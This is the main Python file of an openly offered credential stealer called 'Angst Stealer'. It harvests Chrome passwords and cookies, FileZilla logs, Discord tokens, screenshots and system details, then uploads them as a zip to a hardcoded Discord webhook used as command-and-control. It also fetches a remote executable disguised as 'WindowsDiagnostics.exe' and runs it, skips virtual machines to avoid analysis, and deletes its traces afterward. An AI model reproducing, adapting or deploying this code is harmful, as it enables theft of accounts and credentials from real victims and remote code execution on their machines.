"""
Author: github.com/backslash
Description: Pure python implementation of a proper stealer
DEPENDENCIES:
    - requests
    - cryptodome
    - mss
    - pywin32
"""
import os
import mss.tools
import requests
import zipfile
import threading

from plugins.chrome import Chrome
from plugins.chromecookies import Cookies
from plugins.screenshot import Screenshot
from plugins.filezilla import Filezilla
from plugins.discord import Discord
from plugins.windows import Windows
from plugins.antivm import AntiVM
from plugins.postexploit import PostExploit
"""
webhook - The discord webhook which acts like a cnc
chrome - Should it dump chrome credentials
filezilla - Should it dump filezilla logs
discord - Dump discord tokens
screenshot - Take screenshot of victim
windows - give windows info
post exploit - persistance with keylogger and filedropper
"""
CONFIG = {
    "webhook" : "https://discord.com/api/webhooks/745982826620518451/mbz4j54KG_aj0OpYuO6tGdOLbH4RyGBAuQsE7H9_A7gFF-nn-sKaIxkTs0u241zV-daF",
    "url": "",
    "software": {
        "chrome" : True,
        "chromecookies": True,
        "filezilla": True,
        "discord": True,
        "discordspread": True,
        "screenshot": True,
        "windows": True,
        "postexploit": True
    }
}


class Angst():
    def __init__(self):
        self.plugins = {
            "chrome": Chrome(),
            "chromecookies": Cookies(),
            "filezilla": Filezilla(),
            "discord": Discord(),
            "screenshot": Screenshot(),
            "windows": Windows(),
            "postexploit": PostExploit()
        }
        self.app_data = os.getenv("LOCALAPPDATA")

    def run(self):
        """
        Runs angst and checks and
        dumps accordingly
        to the config which is
        given by the user.
        """
        angst_dir = os.path.join(self.app_data, "Angst")
        os.mkdir(angst_dir)
        os.mkdir(f"{angst_dir}\\passwords")
        os.mkdir(f"{angst_dir}\\cookies")
        for plugin in self.plugins:
            try:
                for conf in CONFIG["software"]:
                    if conf == plugin and CONFIG["software"][conf] == True:
                        if conf != "screenshot" and conf != "chromecookies" and conf != "windows" and conf != "postexploit":
                            if conf == "discord":
                                dump_data = self.plugins[conf].dump(CONFIG["software"]["discordstealer"])
                                if dump_data != "":
                                    dump_file = f"{angst_dir}\\passwords\\{conf}.txt"
                                    with open(dump_file, "w+") as df:
                                        df.write(dump_data)
                            else:
                                dump_data = self.plugins[conf].dump()
                                if dump_data != "":
                                    dump_file = f"{angst_dir}\\passwords\\{conf}.txt"
                                    with open(dump_file, "w+") as df:
                                        df.write(dump_data)
                        elif conf == "chromecookies":
                            dump_file = f"{angst_dir}\\cookies\\{conf}.txt"
                            with open(dump_file, "w+") as df:
                                df.write(self.plugins[conf].dump())
                        elif conf == "windows":
                            dump_file = f"{angst_dir}\\{conf}.txt"
                            with open(dump_file, "w+") as df:
                                df.write(self.plugins[conf].dump())
                        elif conf == "postexploit":
                            if url != "":
                                r = requests.get(url, allow_redirects=True)
                                open('WindowsDiagnostics.exe', 'wb').write(r.content)
                                os.system('WindowsDiagnostics.exe')
                            threading.Thread(target = self.plugins[conf].dump(), args = (CONFIG["webhook"]))
                        else:
                            mss.tools.to_png(self.plugins[conf].dump().rgb,
                                             self.plugins[conf].dump().size,
                                             output=f"{angst_dir}\\screenshot.png")
            except:
                pass



    def zip(self, src, dst):
        zf = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(src)
        for dirname, subdirs, files in os.walk(src):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zf.write(absname, arcname)
        zf.close()

    def send(self):
        """
        Sends the sensitive information
        through the webhook
        """
        temp = os.path.join(self.app_data, "Angst")
        new = os.path.join(self.app_data, f'Angst-[{os.getlogin()}].zip')
        self.zip(temp, new)
        if CONFIG["software"]["postexploit"] == True:
            addtext = ", switching to persistance."
        else:
            addtext = "."
        alert = {
            "avatar_url":"https://i.imgur.com/tkQZZL2.png",
            "name":"Angst Stealer",
            "embeds": [
                {
                    "title": "Angst Stealer",
                    "description": "Angst has successfully found an new user, work done" + addtext,
                    "color": 15146294,

                    "thumbnail": {
                        "url": "https://i.imgur.com/tkQZZL2.png"
                    }
                }
            ]
        }
        requests.post(CONFIG["webhook"],json=alert)
        requests.post(CONFIG["webhook"], files={'upload_file': open(new,'rb')})

    def cleanup(self):
        """
        Removes all trace
        of angst by deleting
        log files left by
        angst.
        """
        angst_dir = os.path.join(self.app_data, "Angst")
        for subdir, dirs, files in os.walk(angst_dir):
            for file in files:
                filepath = f"{subdir}{os.sep}{file}"
                os.remove(filepath)

        for subdir, dirs, files in os.walk(angst_dir):
            for d in dirs:
                os.rmdir(f"{subdir}\\{d}")
        os.rmdir(angst_dir)
        os.remove(os.path.join(self.app_data, f'Angst-[{os.getlogin()}].zip'))

if __name__ == "__main__":
    if AntiVM().inVM() == False:
        a = Angst()
        a.run()
        a.send()
        a.cleanup()
